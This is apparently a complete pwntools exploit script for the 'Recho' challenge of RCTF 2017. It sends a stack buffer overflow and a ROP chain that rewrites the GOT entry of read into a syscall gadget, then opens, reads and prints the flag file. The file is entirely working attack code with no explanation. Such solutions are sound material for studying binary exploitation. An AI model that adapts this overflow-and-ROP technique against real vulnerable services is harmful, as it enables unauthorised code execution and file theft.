#!/usr/bin/env python

from pwn import *
from socket import *

def connection():
	if len(sys.argv) > 1:
		r = process("./Recho")
	else:
		r = remote('recho.2017.teamrois.cn', 9527)
	r.sendlineafter("server!\n", str(9001))
	return r

def trigger(r):
	if len(sys.argv) > 1:
		r.shutdown("send")
	else:
		r.sock.shutdown(SHUT_WR)

def getFlag(r):
	r.recvuntil("RCTF{", drop=True)
	flagContent = r.recvuntil("}")
	return "RCTF{" + flagContent + "}"

popRDIret = 0x4008a3 #: pop rdi ; ret
poppopRSIr15ret = 0x4008a1 #: pop rsi ; pop r15 ; ret
popRDXret = 0x4006fe #: pop rdx ; ret
popRAXret = 0x4006fc #: pop rax ; ret

def setRDI(value):
	rop = p64(popRDIret)
	rop += p64(value)
	return rop

def setRSI(value):
	rop = p64(poppopRSIr15ret)
	rop += p64(value)
	rop += p64(0)
	return rop

def setRDX(value):
	rop = p64(popRDXret)
	rop += p64(value)
	return rop

def setRAX(value):
	rop = p64(popRAXret)
	rop += p64(value)
	return rop

sysCallOffsetInRead = 0xe
def convertReadToSysCall(e):
	#0x000000000040070d : add byte ptr [rdi], al ; ret
	addRdiPtrWithAlRet = 0x40070d
	
	rop = setRDI(e.got['read'])
	rop += setRAX(sysCallOffsetInRead)
	rop += p64(addRdiPtrWithAlRet)
	return rop 

def syscall(sys, e):
	rop = setRAX(sys)
	rop += p64(e.symbols["read"])
	return rop

sys_open = 2
def openFlag(e):
	rop = setRDI(e.symbols["flag"])
	rop += setRSI(0)
	rop += setRDX(0)
	rop += syscall(sys_open, e)
	return rop

sys_read = 0
def readFlag(e):
	fd = 3 #fd 0, 1 and 2 are in use for stdin, stdout and stderr
	rop = setRDI(fd)
	rop += setRSI(e.bss() + 0x100)
	rop += setRDX(100)
	rop += syscall(sys_read, e)
	return rop

sys_write = 1
def writeFlag(e):
	fdStdout = 1  
	rop = setRDI(fdStdout)
	rop += setRSI(e.bss() + 0x100)
	rop += setRDX(100)
	rop += syscall(sys_write, e)
	return rop

def overflowToReturnAddr():
	data = "A" * 0x30
	data += p64(0xfaceface)
	return data

def createPayload():
	e = ELF('Recho')
	rop = overflowToReturnAddr() 
	rop += convertReadToSysCall(e)
	rop += openFlag(e)
	rop += readFlag(e)
	rop += writeFlag(e)
	return rop

if __name__ == "__main__":
	r = connection()
	payload = createPayload()
	r.sendline(payload)
	trigger(r)
	flag = getFlag(r)
	log.info("Winner winner, chicken dinner! {}".format(flag))
